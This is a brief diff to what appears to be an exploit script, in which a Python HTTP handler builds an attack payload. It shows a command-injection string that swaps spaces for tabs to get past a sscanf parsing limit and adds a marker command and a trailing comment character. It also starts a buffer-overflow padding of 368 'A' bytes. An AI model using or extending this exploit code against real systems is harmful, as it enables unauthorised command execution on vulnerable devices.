@@ -90,7 +90,7 @@ class HttpHandler(BaseHTTPRequestHandler):
             cmd = payload
 
         # Replace spaces in the command (spaces cannot be used due to sscanf(str, "%s %s"))
-        cmd = "touch$\t/tmp/st0;" + cmd.replace(" ", "\t") + ";#"
+        cmd = "touch\t/tmp/st0;" + cmd.replace(" ", "\t") + ";#"
 
         # Generate payload
         p  = b"A"*368                                   # [   0: 367]
